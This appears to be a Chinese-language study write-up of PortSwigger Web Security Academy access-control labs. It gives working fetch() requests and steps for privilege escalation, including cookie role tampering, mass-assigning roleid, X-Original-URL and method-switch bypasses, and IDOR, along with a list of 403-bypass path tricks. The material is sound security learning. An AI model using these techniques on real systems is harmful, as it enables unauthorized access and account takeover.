---
title: Access control vulnerabilities and privilege escalation
description: Access control vulnerabilities and privilege escalation
last_update:
  date: "2025-09-11T08:00:00+08:00"
---

## Lab: Unprotected admin functionality

| Dimension | Description                                                                             |
| --------- | --------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/access-control#unprotected-functionality           |
| Lab       | https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality |

訪問 https://0a1500b104bc0be580d0ee1e005c00f0.web-security-academy.net/robots.txt ，看到

```
User-agent: *
Disallow: /administrator-panel
```

訪問 https://0a1500b104bc0be580d0ee1e005c00f0.web-security-academy.net/administrator-panel ，成功刪除使用者

我之前就有用 `robots.txt` 成功發現一個網站的 `/admin` 路由，並且成功找到 SQLi 的漏洞，詳細可參考 [ZD-2025-01022](https://zeroday.hitcon.org/vulnerability/ZD-2025-01022)

## Lab: Unprotected admin functionality with unpredictable URL

| Dimension | Description                                                                                                    |
| --------- | -------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/access-control#unprotected-functionality                                  |
| Lab       | https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url |

在 `/login` 頁面找到

```html
<script>
  var isAdmin = false;
  if (isAdmin) {
    var topLinksTag = document.getElementsByClassName("top-links")[0];
    var adminPanelTag = document.createElement("a");
    adminPanelTag.setAttribute("href", "/admin-ud3qbx");
    adminPanelTag.innerText = "Admin panel";
    topLinksTag.append(adminPanelTag);
    var pTag = document.createElement("p");
    pTag.innerText = "|";
    topLinksTag.appendChild(pTag);
  }
</script>
```

進到 `/admin-ud3qbx`，成功刪除使用者

## Lab: User role controlled by request parameter

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/access-control#parameter-based-access-control-methods        |
| Lab       | https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter |

Cookie 有 `Admin: false`，改成 `true` 就可以成功訪問 `/admin`

## Lab: User role can be modified in user profile

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/access-control#parameter-based-access-control-methods        |
| Lab       | https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile |

這題稍微有點 tricky，要在 `/change-email` 的 API 加上 `roleid: 2`，之後再訪問 `/admin`

但如果沒有題目給的 hint 說 `roleid: 2`，根本不知道會有這個節點啊（？

```js
fetch(
  "https://0a1900e104f2117d813f07a500f200fc.web-security-academy.net/my-account/change-email",
  {
    headers: {
      "content-type": "text/plain;charset=UTF-8",
    },
    body: JSON.stringify({
      email: "wiener@normal-user.net",
      roleid: 2,
    }),
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

## Lab: URL-based access control can be circumvented

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/access-control#broken-access-control-resulting-from-platform-misconfiguration |
| Lab       | https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented               |

嘗試

```js
fetch(`${location.origin}`, {
  headers: {
    "X-Original-URL": "/admin",
  },
});
```

看到

```html
<section>
  <h1>Users</h1>
  <div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
  </div>
  <div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
  </div>
</section>
```

嘗試

```js
fetch(`${location.origin}?username=carlos`, {
  headers: {
    "X-Original-URL": "/admin/delete",
  },
});
```

測起來 `X-Original-URL` 沒辦法傳遞 querystring，所以把 querystring 放在 `fetch` 的 URL

另外，第一次看到 `X-Original-URL` 這個酷東西，感覺是 Web Server 或是各種中間層會加的 Non-Standard-HTTP-Header，所以前端工程師比較少看到，但後端 Application Server 在讀 HTTP-Header 時，可能就會有這個值

我後來查了一下，在 Github 有看到一個蠻有趣的 [repo](https://github.com/sting8k/BurpSuite_403Bypasser)，裡面有提供一些可以 Bypass 403 的 Non-Standard-HTTP-Headers

## Lab: Method-based access control can be circumvented

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/access-control#broken-access-control-resulting-from-platform-misconfiguration |
| Lab       | https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented            |

用 admin 帳密登入後，可以在 `/admin` 頁面看到 Upgrade User 的功能，背後是戳

```js
fetch(`${location.origin}/admin-roles`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "username=carlos&action=upgrade",
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

如果能用 `wiener:peter` 這組帳密成功戳這個 Endpoint，就可以成功把自己變成 admin 角色

嘗試用 GET

```js
fetch(`${location.origin}/admin-roles?username=wiener&action=upgrade`);
```

成功通關

## Lab: User ID controlled by request parameter

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/access-control#horizontal-privilege-escalation             |
| Lab       | https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter |

前面有學到一些 Bypass 技巧，不過這題不會用到

- Casing `/ADMIN/DELETEUSER` => `/admin/deleteUser`
- File Extension `/admin/deleteUser.anything` => `/admin/deleteUser`
- Trailing Slash `/admin/deleteUser/` => `/admin/deleteUser`

訪問 `https://0a52004f035c8b3882635c1f00e900c8.web-security-academy.net/my-account?id=carlos`，成功得到 carlos 的 API Key

## 小結

## 參考資料

- https://portswigger.net/web-security/access-control
